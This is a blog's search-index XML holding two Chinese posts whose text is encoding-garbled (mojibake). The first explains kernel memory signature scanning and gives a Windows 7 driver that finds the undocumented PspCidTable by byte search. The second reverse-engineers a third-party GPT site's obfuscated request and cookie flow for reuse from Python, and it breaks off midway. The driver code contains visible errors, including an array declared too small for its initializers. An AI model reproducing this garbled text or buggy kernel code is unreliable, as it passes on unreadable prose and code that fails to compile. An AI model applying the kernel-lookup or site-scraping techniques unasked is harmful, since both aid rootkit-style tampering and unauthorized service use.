<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>å†…å­˜æœç´¢</title>
    <url>/2023/05/12/%E5%86%85%E5%AD%98%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯å†…å­˜æœç´¢ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å†…å­˜æœç´¢ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å†…å­˜æœç´¢ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å†…å­˜æœç´¢ï¼Ÿ</h2><p>æŸ¥æ‰¾æŒ‡å®šå†…å­˜åŒºæ®µæ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚</p>
<h2 id="å†…å­˜æœç´¢åŸç†æ˜¯å•¥ï¼Ÿ"><a href="#å†…å­˜æœç´¢åŸç†æ˜¯å•¥ï¼Ÿ" class="headerlink" title="å†…å­˜æœç´¢åŸç†æ˜¯å•¥ï¼Ÿ"></a>å†…å­˜æœç´¢åŸç†æ˜¯å•¥ï¼Ÿ</h2><p>ä»ç›®æ ‡å†…å­˜åŒºæ®µèµ·å§‹åœ°å€åˆ°å†…å­˜åŒºæ®µç»“æŸä½ç½®å»åˆ¤æ–­å…¶ä¸­æ˜¯å¦æœ‰æ»¡è¶³æˆ‘ä»¬æ¡ä»¶çš„å€¼ï¼Œæœ‰åˆ™æœç´¢åˆ°äº†ç›®æ ‡åœ°å€ã€‚</p>
<h2 id="å†…å­˜æœç´¢çš„ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#å†…å­˜æœç´¢çš„ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="å†…å­˜æœç´¢çš„ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿ"></a>å†…å­˜æœç´¢çš„ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>1.æ¶æ„ç¨‹åºç‰¹å¾æå–ï¼›</p>
<p>2.ç‰¹æ®Šå˜é‡è·å–ï¼›</p>
<p>3.è·å–æœªå…¬å¼€å‡½æ•°åœ°å€ï¼›</p>
<p>4.and so on.</p>
<h1 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h1><p>è·å–Windows 7 x86çš„PspCidTableå€¼ï¼š</p>
<p>é€šè¿‡windbgæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>dd PspCidTable</code>å‘½ä»¤è·å–åˆ°å…¨å±€å¥æŸ„è¡¨ç›¸å…³ç»“æ„<code>HANDLE_TABLE</code>çš„åœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬å†™ ä»£ç çš„è¿‡ç¨‹ä¸­å´æ²¡åŠæ³•é€šè¿‡è¿™ä¸ªå‘½ä»¤æ‹¿åˆ°PspCidTableçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯é€šè¿‡å­—èŠ‚ç‰¹å¾ç å»æŸ¥æ‰¾åˆ°è¿™ä¸ªå€¼ï¼Œé€šè¿‡å®éªŒå‘ç°åœ¨<code>PsLookupProcessByProcessId</code>è¿™ä¸ªå‡½æ•°é€šè¿‡è¿›ç¨‹idæŸ¥æ‰¾è¿›ç¨‹çš„eprocessæ—¶ä½¿ç”¨åˆ°äº†è¿™ä¸ªPspCidTable,é‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åœ¨é©±åŠ¨åŠ è½½çš„æ—¶å€™å»æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°åœ°å€å¼•ç”¨é‚£å—æ•°æ®ï¼Œä»è€Œä¾¿å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬çš„PspCidTableäº†ã€‚</p>
<p>å…ˆçœ‹çœ‹PsLookupProcessByProcessIdå‡½æ•°çš„ç‰¹å¾ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PAGE:006696E9                                                 var_C= dword ptr -0Ch</span><br><span class="line">PAGE:006696E9                                                 var_8= dword ptr -8</span><br><span class="line">PAGE:006696E9                                                 var_4= dword ptr -4</span><br><span class="line">PAGE:006696E9                                                 ProcessId= dword ptr  8</span><br><span class="line">PAGE:006696E9                                                 Process= dword ptr  0Ch</span><br><span class="line">PAGE:006696E9</span><br><span class="line">PAGE:006696E9 8B FF                                           mov     edi, edi</span><br><span class="line">PAGE:006696EB 55                                              push    ebp</span><br><span class="line">PAGE:006696EC 8B EC                                           mov     ebp, esp</span><br><span class="line">PAGE:006696EE 83 EC 0C                                        sub     esp, 0Ch</span><br><span class="line">PAGE:006696F1 53                                              push    ebx</span><br><span class="line">PAGE:006696F2 56                                              push    esi</span><br><span class="line">PAGE:006696F3 64 8B 35 24 01 00 00                            mov     esi, large fs:124h</span><br><span class="line">PAGE:006696FA 33 DB                                           xor     ebx, ebx</span><br><span class="line">PAGE:006696FC 66 FF 8E 84 00 00 00                            dec     word ptr [esi+84h]</span><br><span class="line">PAGE:00669703 57                                              push    edi</span><br><span class="line">PAGE:00669704 FF 75 08                                        push    [ebp+ProcessId]</span><br><span class="line">PAGE:00669707 8B 3D 94 DD 54 00                               mov     edi, _PspCidTable</span><br><span class="line">PAGE:0066970D E8 21 52 FE FF                                  call    _ExMapHandleToPointer@8         ; ExMapHandleToPointer(x,x)</span><br></pre></td></tr></table></figure></div>

<p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ° <code>mov edi, _PspCidTable</code>è¿™ä¸ªæŒ‡ä»¤ä½¿ç”¨åˆ°äº†PspCidTableçš„å€¼ï¼Œä½†æ˜¯è¿™ä¸ªå€¼ä¸æ˜¯å›ºå®šçš„ï¼Œæ˜¯è¿è¡Œæ—¶æ‰èƒ½å¾—åˆ°å€¼çš„ï¼Œæ‰€ä»¥å’±ä»¬éœ€è¦ç”¨ç›¸é‚»çš„å­—èŠ‚ç‰¹å¾æ¥æ‰¾åˆ°è¿™ä¸ªPspCidTableçš„å€¼ï¼Œé‚£å’±ä»¬å°±ç”¨call _ExMapHandleToPointerç‰¹å¾æŸ¥æ‰¾ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">E8 21 52 FE FF           call    _ExMapHandleToPointer@8</span><br></pre></td></tr></table></figure></div>

<p>å½“ç„¶æˆ‘é€‰ç”¨ä¸Šé¢è¿™æ®µæŒ‡ä»¤çš„ç‰¹å¾æ²¡å»ç¡®å®šæœ‰æ²¡æœ‰å…¶ä»–åœ°æ–¹ä¹Ÿè°ƒç”¨äº†è¿™æ®µæŒ‡ä»¤ï¼Œä½†æ˜¯æˆ‘å°±æ˜¯å¤´é“æˆ‘å°±è¦é€‰å®ƒï¼Œä½ ä»¬ä¹Ÿå¯ä»¥é€‰åˆ™push ediä¸Šé¢é‚£æ¡æŒ‡ä»¤ï¼Œç‰¹å¾æ€§ç›¸å¯¹æ¥è¯´æ¯”æˆ‘é€‰çš„è¿™ä¸ªå¼ºï¼Œå¥½äº†ï¼Œæˆ‘ä»¥è¿™ä¸ªä¾‹å­æ¥è¯´ä¸€ä¸‹ä»£ç æ€è·¯ï¼Œä¹Ÿæ˜¯æš´åŠ›æœç´¢æ€è·¯ï¼š</p>
<p>1.è·å–PsLookupProcessByProcessIdæ‰€åœ¨æ¨¡å—åœ°å€å’Œæ¨¡å—å¤§å°ï¼Œæ¨¡å—åä¸ºâ€œntkrnlpa.exeâ€ï¼Œæ¨¡å—åœ°å€ä¾¿æ˜¯å†…å­˜æœç´¢èµ·å§‹åœ°å€ï¼Œæ¨¡å—åœ°å€+æ¨¡å—å¤§å°ä¾¿æ˜¯æœç´¢ç»“æŸåœ°å€ï¼›</p>
<p>2.ä»æœç´¢èµ·å§‹åœ°å€ä¸åœåˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸€å—è¿ç»­å†…å­˜æ˜¯ç¬¦åˆæˆ‘ä»¬ç‰¹å¾çš„æ˜¯çš„è¯å°±æ‰¾åˆ°äº†ï¼Œè¿”å›è¿™ä¸ªåœ°å€ï¼›</p>
<p>3.PspCidTableåœ°å€å 4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡ç‰¹å¾æ‹¿åˆ°çš„åœ°å€å‡å»4ä¸ªå­—èŠ‚å°±å¾—åˆ°äº†PspCidTableçš„åœ°å€äº†ï¼›</p>
<p><strong>å¥‰ä¸Šä»£ç ï¼š</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;ntifs.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct _RTL_PROCESS_MODULE_INFORMATION &#123;</span><br><span class="line">        HANDLE Section;                 // Not filled in</span><br><span class="line">        PVOID MappedBase;</span><br><span class="line">        PVOID ImageBase;</span><br><span class="line">        ULONG ImageSize;</span><br><span class="line">        ULONG Flags;</span><br><span class="line">        USHORT LoadOrderIndex;</span><br><span class="line">        USHORT InitOrderIndex;</span><br><span class="line">        USHORT LoadCount;</span><br><span class="line">        USHORT OffsetToFileName;</span><br><span class="line">        UCHAR  FullPathName[256];</span><br><span class="line">&#125; RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;</span><br><span class="line">typedef struct _RTL_PROCESS_MODULES &#123;</span><br><span class="line">        ULONG NumberOfModules;</span><br><span class="line">        RTL_PROCESS_MODULE_INFORMATION Modules[1];</span><br><span class="line">&#125; RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;</span><br><span class="line">typedef enum _SYSTEM_INFORMATION_CLASS &#123;</span><br><span class="line">        SystemBasicInformation,</span><br><span class="line">        SystemProcessorInformation,             // obsolete...delete</span><br><span class="line">        SystemPerformanceInformation,</span><br><span class="line">        SystemTimeOfDayInformation,</span><br><span class="line">        SystemPathInformation,</span><br><span class="line">        SystemProcessInformation,</span><br><span class="line">        SystemCallCountInformation,</span><br><span class="line">        SystemDeviceInformation,</span><br><span class="line">        SystemProcessorPerformanceInformation,</span><br><span class="line">        SystemFlagsInformation,</span><br><span class="line">        SystemCallTimeInformation,</span><br><span class="line">        SystemModuleInformation,</span><br><span class="line">        SystemLocksInformation,</span><br><span class="line">        SystemStackTraceInformation,</span><br><span class="line">        SystemPagedPoolInformation,</span><br><span class="line">        SystemNonPagedPoolInformation,</span><br><span class="line">        SystemHandleInformation,</span><br><span class="line">        SystemObjectInformation,</span><br><span class="line">        SystemPageFileInformation,</span><br><span class="line">        SystemVdmInstemulInformation,</span><br><span class="line">        SystemVdmBopInformation,</span><br><span class="line">        SystemFileCacheInformation,</span><br><span class="line">        SystemPoolTagInformation,</span><br><span class="line">        SystemInterruptInformation,</span><br><span class="line">        SystemDpcBehaviorInformation,</span><br><span class="line">        SystemFullMemoryInformation,</span><br><span class="line">        SystemLoadGdiDriverInformation,</span><br><span class="line">        SystemUnloadGdiDriverInformation,</span><br><span class="line">        SystemTimeAdjustmentInformation,</span><br><span class="line">        SystemSummaryMemoryInformation,</span><br><span class="line">        SystemMirrorMemoryInformation,</span><br><span class="line">        SystemPerformanceTraceInformation,</span><br><span class="line">        SystemObsolete0,</span><br><span class="line">        SystemExceptionInformation,</span><br><span class="line">        SystemCrashDumpStateInformation,</span><br><span class="line">        SystemKernelDebuggerInformation,</span><br><span class="line">        SystemContextSwitchInformation,</span><br><span class="line">        SystemRegistryQuotaInformation,</span><br><span class="line">        SystemExtendServiceTableInformation,</span><br><span class="line">        SystemPrioritySeperation,</span><br><span class="line">        SystemVerifierAddDriverInformation,</span><br><span class="line">        SystemVerifierRemoveDriverInformation,</span><br><span class="line">        SystemProcessorIdleInformation,</span><br><span class="line">        SystemLegacyDriverInformation,</span><br><span class="line">        SystemCurrentTimeZoneInformation,</span><br><span class="line">        SystemLookasideInformation,</span><br><span class="line">        SystemTimeSlipNotification,</span><br><span class="line">        SystemSessionCreate,</span><br><span class="line">        SystemSessionDetach,</span><br><span class="line">        SystemSessionInformation,</span><br><span class="line">        SystemRangeStartInformation,</span><br><span class="line">        SystemVerifierInformation,</span><br><span class="line">        SystemVerifierThunkExtend,</span><br><span class="line">        SystemSessionProcessInformation,</span><br><span class="line">        SystemLoadGdiDriverInSystemSpace,</span><br><span class="line">        SystemNumaProcessorMap,</span><br><span class="line">        SystemPrefetcherInformation,</span><br><span class="line">        SystemExtendedProcessInformation,</span><br><span class="line">        SystemRecommendedSharedDataAlignment,</span><br><span class="line">        SystemComPlusPackage,</span><br><span class="line">        SystemNumaAvailableMemory,</span><br><span class="line">        SystemProcessorPowerInformation,</span><br><span class="line">        SystemEmulationBasicInformation,</span><br><span class="line">        SystemEmulationProcessorInformation,</span><br><span class="line">        SystemExtendedHandleInformation,</span><br><span class="line">        SystemLostDelayedWriteInformation,</span><br><span class="line">        SystemBigPoolInformation,</span><br><span class="line">        SystemSessionPoolTagInformation,</span><br><span class="line">        SystemSessionMappedViewInformation,</span><br><span class="line">        SystemHotpatchInformation,</span><br><span class="line">        SystemObjectSecurityMode,</span><br><span class="line">        SystemWatchdogTimerHandler,</span><br><span class="line">        SystemWatchdogTimerInformation,</span><br><span class="line">        SystemLogicalProcessorInformation,</span><br><span class="line">        SystemWow64SharedInformation,</span><br><span class="line">        SystemRegisterFirmwareTableInformationHandler,</span><br><span class="line">        SystemFirmwareTableInformation,</span><br><span class="line">        SystemModuleInformationEx,</span><br><span class="line">        SystemVerifierTriageInformation,</span><br><span class="line">        SystemSuperfetchInformation,</span><br><span class="line">        SystemMemoryListInformation,</span><br><span class="line">        SystemFileCacheInformationEx,</span><br><span class="line">        MaxSystemInfoClass  // MaxSystemInfoClass should always be the last enum</span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line">NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(</span><br><span class="line">        __in SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">        __out_bcount_opt(SystemInformationLength) PVOID SystemInformation,</span><br><span class="line">        __in ULONG SystemInformationLength,</span><br><span class="line">        __out_opt PULONG ReturnLength</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">ULONG_PTR GetKernelModuleBase(PUCHAR moduleName, PULONG pModuleSize) &#123;</span><br><span class="line">        RTL_PROCESS_MODULES SysModules = &#123; 0 &#125;;</span><br><span class="line">        PRTL_PROCESS_MODULES pModules = &amp;SysModules;</span><br><span class="line">        ULONG SystemInformationLength = 0;</span><br><span class="line">        //æŸ¥è¯¢ç³»ç»Ÿä¸­æ‰€æœ‰å†…æ ¸æ¨¡å—ï¼Œåº•å±‚ä¹Ÿæ˜¯éå†é“¾è¡¨</span><br><span class="line">        NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, pModules, sizeof(RTL_PROCESS_MODULES), &amp;SystemInformationLength);</span><br><span class="line">        if (status == STATUS_INFO_LENGTH_MISMATCH) &#123;</span><br><span class="line">                pModules = ExAllocatePool(NonPagedPool, SystemInformationLength + sizeof(RTL_PROCESS_MODULES));</span><br><span class="line">                RtlZeroMemory(pModules, SystemInformationLength + sizeof(RTL_PROCESS_MODULES));</span><br><span class="line">                status = ZwQuerySystemInformation(SystemModuleInformation, pModules, SystemInformationLength + sizeof(RTL_PROCESS_MODULES), &amp;SystemInformationLength);</span><br><span class="line">                if (!NT_SUCCESS(status)) &#123;</span><br><span class="line">                        ExFreePool(pModules);</span><br><span class="line">                        return 0;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!strcmp(&quot;ntkrnlpa.exe&quot;, moduleName)) &#123;</span><br><span class="line">                ULONG_PTR ret = pModules-&gt;Modules[0].ImageBase;</span><br><span class="line">                *pModuleSize = pModules-&gt;Modules[0].ImageSize;</span><br><span class="line">                if (SystemInformationLength) &#123;</span><br><span class="line">                        ExFreePool(pModules);</span><br><span class="line">                &#125;</span><br><span class="line">                return ret;</span><br><span class="line">        &#125;</span><br><span class="line">        for (ULONG i = 0; i &lt; pModules-&gt;NumberOfModules; i++) &#123;</span><br><span class="line">                if (strstr(pModules-&gt;Modules[i].FullPathName, moduleName)) &#123;</span><br><span class="line">                        ULONG_PTR ret = pModules-&gt;Modules[i].ImageBase;</span><br><span class="line">                        *pModuleSize = pModules-&gt;Modules[0].ImageSize;</span><br><span class="line">                        if (SystemInformationLength) &#123;</span><br><span class="line">                                ExFreePool(pModules);</span><br><span class="line">                        &#125;</span><br><span class="line">                        //è¿”å›æ¨¡å—åœ°å€</span><br><span class="line">                        return ret;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (SystemInformationLength) &#123;</span><br><span class="line">                ExFreePool(pModules);</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PVOID SearchSpecialCode(PVOID pSearchBeginAddr, ULONG ulSearchLength, PUCHAR pSpecialCode, ULONG ulSpecialCodeLength)</span><br><span class="line">&#123;</span><br><span class="line">        PVOID pDestAddr = NULL;</span><br><span class="line">        PUCHAR pBeginAddr = (PUCHAR)pSearchBeginAddr;</span><br><span class="line">        PUCHAR pEndAddr = pBeginAddr + ulSearchLength;</span><br><span class="line">        PUCHAR i = NULL;</span><br><span class="line">        ULONG j = 0;</span><br><span class="line"></span><br><span class="line">        for (i = pBeginAddr; i &lt;= pEndAddr; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                // éå†ç‰¹å¾ç </span><br><span class="line">                for (j = 0; j &lt; ulSpecialCodeLength; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        // åˆ¤æ–­åœ°å€æ˜¯å¦æœ‰æ•ˆ</span><br><span class="line">                        if (FALSE == MmIsAddressValid((PVOID)(i + j)))</span><br><span class="line">                        &#123;</span><br><span class="line">                                break;</span><br><span class="line">                        &#125;</span><br><span class="line">                        // åŒ¹é…ç‰¹å¾ç </span><br><span class="line">                        if (*(PUCHAR)(i + j) != pSpecialCode[j])</span><br><span class="line">                        &#123;</span><br><span class="line">                                break;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // åŒ¹é…æˆåŠŸ</span><br><span class="line">                if (j &gt;= ulSpecialCodeLength)</span><br><span class="line">                &#123;</span><br><span class="line">                        pDestAddr = (PVOID)i;</span><br><span class="line">                        break;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return pDestAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID UnloadDriver(PDRIVER_OBJECT pDriver)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pRegPath)</span><br><span class="line">&#123;</span><br><span class="line">        ULONG sizeofcode = 0;</span><br><span class="line">        ULONG_PTR baseaddr = GetKernelModuleBase(&quot;ntkrnlpa.exe&quot;, &amp;sizeofcode);</span><br><span class="line">        DbgPrintEx(77, 0, &quot;[db]:baseåœ°å€ä¸º:%p\n&quot;, baseaddr);</span><br><span class="line">        DbgPrintEx(77, 0, &quot;[db]:baseé•¿åº¦ä¸º:%p\n&quot;, sizeofcode);</span><br><span class="line">        UCHAR specode[4] = &#123; 0xE8, 0x21, 0x52, 0xFE,0xFF &#125;;</span><br><span class="line">        ULONG_PTR codeaddr = SearchSpecialCode(baseaddr, sizeofcode, specode,5);</span><br><span class="line">        DbgPrintEx(77, 0, &quot;[db]:æ‰¾åˆ°çš„ä»£ç åœ°å€ä¸º:%p\n&quot;, codeaddr);</span><br><span class="line">        ULONG_PTR uGetPspGet = (*(PULONG)((PUCHAR)codeaddr - 6 + 2));</span><br><span class="line">        DbgPrintEx(77, 0, &quot;[db]:å…¨å±€å¥æŸ„è¡¨çš„åœ°å€ä¸º:%p\n&quot;, uGetPspGet);</span><br><span class="line">        pDriver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">        return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



]]></content>
  </entry>
  <entry>
    <title>GPTç½‘ç«™é—®ç­”æµç¨‹é€†å‘å’ŒPythonå¤ç°</title>
    <url>/2023/05/12/GPT%E7%BD%91%E7%AB%99%E9%97%AE%E7%AD%94%E6%B5%81%E7%A8%8B%E9%80%86%E5%90%91%E5%92%8CPython%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h2><p>F12æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œè¾“å…¥é—®é¢˜ï¼Œç‚¹å‡»å‘é€ï¼ŒæŸ¥çœ‹Networkè®°å½•</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s1.ax1x.com/2023/05/05/p9NsS41.png"
                     
                ></p>
<p>å‘ç°æœ‰ä¸¤æ¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¡æ˜¯æ™®é€šçš„XMLHttpRequestï¼Œç¬¬äºŒæ¡æ˜¯ä¸€ä¸ªstreamæµï¼Œè”æƒ³åˆ°ç½‘ç«™æ˜¾ç¤ºå›ç­”æ—¶é€šå¸¸ä¸€ä¸ªå­—ä¸€ä¸ªå­—é€æ­¥æ˜¾ç¤ºï¼Œå›ç­”åº”è¯¥å°±æ˜¯é€šè¿‡streamæµä¼ è¾“çš„</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s1.ax1x.com/2023/05/05/p9NsC36.png"
                     
                ></p>
<p>æŸ¥çœ‹è¯¥æµï¼Œæœç„¶å°†ç­”æ¡ˆæ‹†å¼€ä¼ è¾“ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡è¯·æ±‚äº†ï¼Œè§‚å¯Ÿstreamæµè¯·æ±‚ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s1.ax1x.com/2023/05/05/p9NyUdH.png"
                     
                ></p>
<p>è¿™æ ·çš„ä¸å¸¦å‚æ•°çš„getè¯·æ±‚å¦‚ä½•ä½¿æœåŠ¡ç«¯ç¡®å®šé—®é¢˜æ˜¯ä»€ä¹ˆå‘¢ï¼ŒçŒœæµ‹ç½‘ç«™å¯¹cookieè¿›è¡Œäº†æ“ä½œï¼ŒæŸ¥çœ‹ä¸¤æ¡è¯·æ±‚çš„cookieï¼š</p>
<p>1.submitçš„cookie</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s1.ax1x.com/2023/05/05/p9NsPgK.png"
                     
                ></p>
<p>2.streamçš„cookie</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s1.ax1x.com/2023/05/05/p9NrjHJ.png"
                     
                ></p>
<p>å‘ç°åœ¨submitåï¼Œå“åº”ä½“è®¾ç½®äº†æ–°çš„cookieï¼š<code>session</code>ï¼Œå› æ­¤åªè¦è·å–è¯¥sessionçš„cookieå€¼ï¼Œå°±å¯ä»¥ç¼–å†™è¯·æ±‚ç´¢å–GPTçš„å›ç­”ã€‚ä¸ºäº†è·å–sessionå€¼ï¼Œåˆ™éœ€è¦å…ˆå‘é€submitè¯·æ±‚ï¼Œè§‚å¯Ÿè¯¥è¯·æ±‚ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œé€šè¿‡Payloadçš„æ–¹å¼ä¸Šä¼ æ•°æ®</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s1.ax1x.com/2023/05/05/p9Ns99x.png"
                     
                ></p>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼š<code>his</code>å’Œ<code>prompt</code>ï¼Œpromptå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯å‘é€çš„é—®é¢˜ï¼Œæ­¤å¤„è¿›è¡Œäº†åŠ å¯†å¤„ç†ï¼Œhisæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå¤§æ¦‚ç‡æ˜¯å†å²è®°å½•ï¼ˆè¯¥GPTæœ‰æ ¹æ®ä¸Šæ–‡å›ç­”é—®é¢˜çš„åŠŸèƒ½ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆåˆ†æpromptçš„ç”Ÿæˆ</p>
<p>è§‚å¯Ÿåˆ°submitè¯·æ±‚çš„Initiatoræ˜¯main.jsï¼Œç›´æ¥åˆ°è¯¥æ–‡ä»¶ä¸­æœç´¢â€promptâ€ï¼Œå‘ç°å¹¶æ²¡æœ‰ç»“æœ</p>
<p>è§‚å¯Ÿmain.jsï¼Œå‘ç°æ˜¯åŠ å¯†æ··æ·†è¿‡çš„ï¼Œå…¶ä¸­æœ‰å¤§é‡çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²å’Œä¸€å †æ¯«æ— æ„ä¹‰çš„åç§»å’Œå‡½æ•°</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s1.ax1x.com/2023/05/05/p9NrxE9.png"
                     
                ></p>
<p>æŠŠæ–‡ä»¶é€å…¥è§£å¯†ç½‘ç«™ï¼ŒæŠŠä»£ç è¿›è¡Œè§£ç ï¼Œå†æ¬¡æœç´¢â€promptâ€</p>
<p>æˆåŠŸå®šä½åˆ°äº†ä½ç½®ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var W = input_value;  // è¾“å…¥çš„é—®é¢˜å­—ç¬¦ä¸²</span><br><span class="line">document[n(zZ.Xb, 0x145, zZ.js, zZ.XR) + &#x27;Ele&#x27; + n(0x1de, 0x30e, &#x27;z$N#&#x27;, 0x1e2) + &#x27;tBy&#x27; + &#x27;Id&#x27;](I[d(zZ.Xm, zZ.XV, 0x25, -zZ.XM) + &#x27;kc&#x27;])[d(zZ.XO, zZ.XH, 0x45, 0x154) + &#x27;ue&#x27;] = &#x27;&#x27;;</span><br><span class="line">var y = I[d(zZ.Xt, zZ.XQ, -0x147, zZ.Xe) + &#x27;SF&#x27;](P, W);</span><br><span class="line">D[n(0x1b5, zZ.um, &#x27;YS3C&#x27;, 0x114) + &#x27;d&#x27;](JSON[d(&#x27;5l3F&#x27;, -0xef, -zZ.XT, -0x20f) + n(zZ.Xl, 0x174, &#x27;jHS6&#x27;, -zZ.Xs) + n(0xea, zZ.XZ, zZ.Xa, -zZ.XG)](&#123;</span><br><span class="line">    &#x27;prompt&#x27;: y,</span><br><span class="line">    &#x27;his&#x27;: window[n(zZ.XJ, -0x2, &#x27;2Qf[&#x27;, 0x74) + d(&#x27;[qgO&#x27;, -zZ.XF, -zZ.Xr, -zZ.jz) + &#x27;ys&#x27;][n(zZ.Xc, 0x154, &#x27;i2$#&#x27;, 0x1bc) + d(zZ.Xv, -zZ.XE, -zZ.Xh, -0x2ad)] &lt;= 0x1d * 0x76 + 0x18f2 + -0xcc5 * 0x3 || !document[n(0x1e, -zZ.Xn, &#x27;xt$S&#x27;, zZ.Xd) + &#x27;Ele&#x27; + n(0x8, -0x3e, &#x27;5l3F&#x27;, zZ.XK) + n(zZ.XL, -0x57, &#x27;8UZA&#x27;, zZ.S0) + &#x27;Id&#x27;](I[d(zZ.S1, -0x1cb, -0x311, -0x7f) + &#x27;pZ&#x27;])[n(0x1fe, zZ.S2, &#x27;2Qf[&#x27;, zZ.S3) + &#x27;cke&#x27; + &#x27;d&#x27;] ? [] : window[d(zZ.S4, -0x22a, -zZ.S5, -zZ.S6) + n(zZ.ja, -zZ.S7, zZ.u0, 0x18c) + &#x27;ys&#x27;]</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></div>

<p>æ•´ä¸ªä»£ç éƒ½è¢«æ··æ·†äº†ï¼Œä½†ä¾ç¨€è¿˜èƒ½è§åˆ°ä¸€äº›å½±å­ï¼Œæ¯”å¦‚ç¬¬äºŒè¡Œä¸­èƒ½æ‹¼å‡‘å‡ºç†Ÿæ‚‰çš„<code>ElementById</code></p>
<p>è¿™é‡Œèƒ½å‘ç°ï¼Œpromptå€¼å°±æ˜¯yï¼Œè€Œhisçš„å€¼åˆ™æ˜¯å…ˆæ¯”è¾ƒäº†<code>historyCheck</code>çš„å€¼ï¼Œå¦‚æœé€‰æ‹©äº†åˆ™ä¸ºåˆ—è¡¨å€¼ï¼Œæœªé€‰æ‹©åˆ™ä¸ºç©ºåˆ—è¡¨<code>[]</code></p>
<p>é‡ç‚¹åœ¨yçš„è®¡ç®—ä¸Šï¼Œæ­¤å¤„æ‰“ä¸Šæ–­ç‚¹ï¼Œé‡æ–°å‘é€ï¼Œå®šä½åˆ°è¯¥å‡½æ•°çš„ä½ç½®ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;\x5a\x41\x7a\x53\x46&#x27;: function(x, U) &#123;</span><br><span class="line">    return x(U);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></div>

<p>å³:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var y = P(W);</span><br></pre></td></tr></table></figure></div>

<p>è·³è½¬åˆ°å‡½æ•°Pï¼š</p>
